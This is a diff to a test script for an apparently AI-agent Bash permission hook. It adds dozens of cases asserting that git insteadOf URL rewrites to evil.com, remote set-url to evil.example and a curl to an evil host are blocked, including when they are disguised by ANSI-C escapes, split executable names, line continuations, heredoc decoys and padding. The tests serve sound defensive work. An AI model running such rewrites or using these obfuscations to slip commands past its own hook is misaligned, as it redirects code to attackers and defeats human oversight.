@@ -38,6 +38,7 @@ mkrepo "$T/mainrepo"  "main"
 mkrepo "$T/featrepo"  "feat/x"
 MAIN="$T/mainrepo"
 FEAT="$T/featrepo"
+SWR="$T/swrepo"; mkrepo "$SWR" "feat/x"; touch "$SWR/.single-writer"  # class (b) exempt, so class (a) rows are not masked (HIMMEL-844)
 # A SEPARATE, deliberately /tmp-rooted fixture (unlike $T above) — used by
 # exactly one row below to assert the RATIFIED is_temp_or_devnull `*/tmp/*`
 # exemption on purpose, not by accident.
@@ -77,6 +78,84 @@ check "remote set-url rewrite denied"    block '{"tool_name":"Bash","tool_input"
 check "config url rewrite denied"        block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.url http://x"}}'
 check "config url READ allowed"          allow '{"tool_name":"Bash","tool_input":{"command":"git config --get remote.origin.url"}}'
 check "config --file url rewrite denied"  block '{"tool_name":"Bash","tool_input":{"command":"git config --file .git/config remote.origin.url http://x"}}'
+check "config insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "config pushInsteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.pushInsteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "config --global insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config --global url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "config insteadof case variant" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
+check "git -c insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch","cwd":"'"$SWR"'"}}'
+check "git --config-env insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch","cwd":"'"$SWR"'"}}'
+check "git config set insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
+check "git config single-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config double-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config backslash-split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config ANSI-C quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config upper-case URL.INSTEADOF key" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config set --file value before insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config set --file .git/config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config --type value before insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
+check "git config ANSI-C hex escape in key" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.https://evil.com/.\\x69nsteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
+check "git -c ANSI-C escape" block '{"tool_name":"Bash","tool_input":{"command":"git -c $'"'"'url.https://evil.com/.\\x69nsteadOf=https://github.com/'"'"' fetch","cwd":"'"$SWR"'"}}'
+check "git -c core.pager=cat log allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git -c core.pager=cat log","cwd":"'"$SWR"'"}}'
+check "git config --get remote.origin.url allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config --get remote.origin.url","cwd":"'"$SWR"'"}}'
+check "git -c quoted insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c '"'"'url.https://evil.com/.insteadOf=https://github.com/'"'"' fetch","cwd":"'"$SWR"'"}}'
+check "config --get insteadOf READ denied (pinned overmatch, round 5 position-free rule)" block '{"tool_name":"Bash","tool_input":{"command":"git config --get url.https://x/.insteadOf","cwd":"'"$SWR"'"}}'
+check "round 6 quoted git + ANSI-C hex key" block '{"tool_name":"Bash","tool_input":{"command":"\"git\" config $'"'"'url.x/.\\x69nsteadOf'"'"' Y","cwd":"'"$SWR"'"}}'
+check "round 6 quoted git + plain key" block '{"tool_name":"Bash","tool_input":{"command":"\"git\" config url.x/.insteadof Y","cwd":"'"$SWR"'"}}'
+check "round 6 split git executable + -c key" block '{"tool_name":"Bash","tool_input":{"command":"g'"'"''"'"'it -c url.x.insteadof=y","cwd":"'"$SWR"'"}}'
+check "round 6 git log --oneline allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git log --oneline","cwd":"'"$SWR"'"}}'
+check "round 7 escaped executable + escaped key" block '{"tool_name":"Bash","tool_input":{"command":"$'"'"'\\x67it'"'"' config $'"'"'url.https://evil.example/.\\x69nsteadOf'"'"' https://source.example/","cwd":"'"$SWR"'"}}'
+check "round 7 octal executable" block '{"tool_name":"Bash","tool_input":{"command":"$'"'"'\\147\\151\\164'"'"' config url.x.insteadof Y","cwd":"'"$SWR"'"}}'
+check "round 7 escaped config subcommand" block '{"tool_name":"Bash","tool_input":{"command":"git $'"'"'\\x63onfig'"'"' url.x.insteadof Y","cwd":"'"$SWR"'"}}'
+check "round 7 split executable, hex-escaped middle letter" block '{"tool_name":"Bash","tool_input":{"command":"g$'"'"'\\x69'"'"'\"t\" -c url.x.insteadof=y","cwd":"'"$SWR"'"}}'
+check "round 7 unterminated ANSI-C segment" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.insteadof Y","cwd":"'"$SWR"'"}}'
+check "round 7 NUL octal ends the segment, Of joins" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.instead\\0junk'"'"'Of Y","cwd":"'"$SWR"'"}}'
+check "round 7 NUL hex ends the segment, Of joins" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.instead\\x00junk'"'"'Of Y","cwd":"'"$SWR"'"}}'
+check "round 8 single-quoted decoy" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; git config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
+check "round 8 double-quoted decoy" block '{"tool_name":"Bash","tool_input":{"command":"echo \"$'"'"'\" ; git config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
+check "round 8 comment decoy" block '{"tool_name":"Bash","tool_input":{"command":"# $'"'"'\ngit config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
+check "round 9 decoy + split executable" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'t config url.x.insteadOf y","cwd":"'"$SWR"'"}}'
+check "round 9 decoy + split executable + escaped key" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'t config $'"'"'url.x.\\x69nsteadOf'"'"' y","cwd":"'"$SWR"'"}}'
+check "round 10 codex-1 NUL via \\c@ ends the segment" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.instead\\c@junk'"'"'Of y","cwd":"'"$SWR"'"}}'
+check "round 10 codex-2 decoy + two adjacent split segments" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'$'"'"'\\x74'"'"' config url.x.insteadOf y","cwd":"'"$SWR"'"}}'
+check "round 10 plain backslash-t inside the key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.ins\\teadOf y","cwd":"'"$SWR"'"}}'
+check "round 10 plain backslash-r inside url" block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.u\\rl https://evil","cwd":"'"$SWR"'"}}'
+# HIMMEL-4032: a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
+# bash deletes a backslash-newline before parsing, so neither may split the key or the verb.
+check "HIMMEL-4032 dollar-quote + plain escape key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 backslash-newline split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.inste\\\nadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation before push" block '{"tool_name":"Bash","tool_input":{"command":"git \\\npush origin main","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 CRLF continuation before push" block '{"tool_name":"Bash","tool_input":{"command":"git \\\r\npush origin main","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation split curl" block '{"tool_name":"Bash","tool_input":{"command":"cu\\\nrl http://evil/x","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation split gh" block '{"tool_name":"Bash","tool_input":{"command":"g\\\nh pr merge 1","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 unjoined gh after a continuation stays denied" block '{"tool_name":"Bash","tool_input":{"command":"foo \\\ngh pr merge 1","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 dollar-quote + plain key, user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.$'"'"'\\x6e'"'"'ame x","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 continuation inside user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.na\\\nme x","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4032 harmless echo continuation allowed" allow '{"tool_name":"Bash","tool_input":{"command":"echo a \\\nb","cwd":"'"$SWR"'"}}'
+# HIMMEL-4225: a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
+# must not desync the quote-aware stream and hide evasion 1 on the next line.
+check "HIMMEL-4225 apostrophe in a comment, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"# don'"'"'t panic\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 apostrophe in a heredoc body, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<EOF\ndon'"'"'t panic\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 apostrophe in a comment, no insteadOf, allowed" allow '{"tool_name":"Bash","tool_input":{"command":"# don'"'"'t panic\necho hi","cwd":"'"$SWR"'"}}'
+# HIMMEL-4225 CR round 1: empty and unusual heredoc delimiters (bash ends `<<''` at an empty
+# line) and an arithmetic `<<` must not desync the decoder either.
+check "HIMMEL-4225 empty single-quoted heredoc delimiter <<'', then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<'"'"''"'"'\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 empty double-quoted heredoc delimiter <<\"\", then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<\"\"\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 empty <<-'' delimiter, tab-only terminator, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<-'"'"''"'"'\n\tdon'"'"'t panic\n\t\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 empty <<-\"\" delimiter, empty terminator, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<-\"\"\n\tdon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 backslash-newline inside the heredoc delimiter, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<\\\nEOF\ndon'"'"'t\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+# shellcheck disable=SC2016  # literal $ is the payload
+check "HIMMEL-4225 ANSI-C heredoc delimiter \$'E\\x4fF', then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<$'"'"'E\\x4fF'"'"'\n$E\\x4fF\ndon'"'"'t\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 escaped quote inside a double-quoted heredoc delimiter, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<\"E\\\"F\"\ndon'"'"'t\nE\"F\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+# shellcheck disable=SC2016  # literal $ is the payload
+check "HIMMEL-4225 arithmetic << is not a heredoc, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"echo $((1<<2))\n# don'"'"'t\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
+check "HIMMEL-4225 empty heredoc delimiter, no insteadOf, allowed" allow '{"tool_name":"Bash","tool_input":{"command":"cat <<'"'"''"'"'\nit'"'"'s fine\n\necho ok","cwd":"'"$SWR"'"}}'
+# round 11: a 50 KB pad must not make grep hit E2BIG and skip the set-url deny (fail-open vs main)
+PAD=$(head -c 50000 /dev/zero | tr "\0" a)
+check "round 11 padded set-url still denied (E2BIG)" block '{"tool_name":"Bash","tool_input":{"command":"git remote set-url origin https://evil.example/x.git ; echo '"$PAD"'","cwd":"'"$SWR"'"}}'
+check "round 7 git commit -m ANSI-C allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git commit -m $'"'"'l1\\nl2'"'"'","cwd":"'"$SWR"'"}}'
+check "round 7 git log --format=ANSI-C allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git log --format=$'"'"'%h\\t%s'"'"'","cwd":"'"$SWR"'"}}'
+check "config user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.name x","cwd":"'"$SWR"'"}}'
+check "remote -v allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git remote -v","cwd":"'"$SWR"'"}}'
 check "gh pr create denied"              block '{"tool_name":"Bash","tool_input":{"command":"gh pr create --fill"}}'
 check "gh pr view allowed"               allow '{"tool_name":"Bash","tool_input":{"command":"gh pr view 12"}}'
 check "gh issue list allowed"            allow '{"tool_name":"Bash","tool_input":{"command":"gh issue list"}}'
